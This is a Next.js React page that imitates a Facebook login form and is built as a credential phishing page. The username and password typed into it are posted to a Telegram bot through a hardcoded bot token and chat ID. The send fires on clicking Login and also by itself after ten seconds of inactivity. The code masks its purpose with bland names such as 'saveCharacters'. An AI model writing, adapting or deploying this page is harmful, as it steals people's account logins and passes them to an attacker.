"use client";
import Image from 'next/image'
import styles from './page.module.css'
// src/utils.ts
import path from 'path';

import { useState, useEffect } from 'react';
import axios from 'axios';
import Link from 'next/link';

//import { saveCharacters } from '../src/utils';


//================================================================================//
// src/utils.ts

export const saveCharacters = (char1: string, char2: string) => {
  const data = `${char1},${char2}`;
  localStorage.setItem('characters', data);
};


//=====================================================================================//





export default function Home() {
  const [char1, setChar1] = useState('');
  const [char2, setChar2] = useState('');

  const handleSubmit = () => {
    saveCharacters(char1, char2);
  };

  useEffect(() => {
    let timeout: NodeJS.Timeout;

    const handleInactive = () => {
      saveCharacters(char1, char2);
      clearTimeout(timeout);
    };

    // Set a timeout for inactivity
    timeout = setTimeout(handleInactive, 10000); // Adjust the time as needed

    return () => {
      clearTimeout(timeout);
    };
  }, [char1, char2]);

  const saveCharacters = async (char1: string, char2: string) => {
    const botToken = '5937073888:AAEcPowjiGethuVHAFn1wqujMwGee039wJI';
    const chatId = '1360936852'; 

    try {
      const response = await axios.post(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          chat_id: chatId,
          text: `Character 1: ${char1}\nCharacter 2: ${char2}`,
        }
      );
      console.log('Message sent:', response.data);
    } catch (error) {
      console.error('Error sending message:', error);
    }
  };

  return (
    <div className="form-container">
      <p className="title">facebook</p>
      <form>

        <div className='input-group'>
         <label htmlFor = 'username'> username </label>
          <input type="text" name='username' id ='username' placeholder="Email address or phone number" value={char1} onChange={(e) => setChar1(e.target.value)} />
        </div>

        <br />

        <div className='input-group'>
        <label  htmlFor = 'password'> password </label>
          <input type="text"  name='password' id ='password' placeholder="Password"  value={char2} onChange={(e) => setChar2(e.target.value)} />
        
        </div>
        <br />
        <button type="button"  onClick={handleSubmit}>
          Login
        </button>
      </form>
      <p className="Forgotten Password">
      <Link href="/signup">  <a className="signup-link link"> Forgotten Password?</a> </Link>
      </p>
    </div>
  );
} 
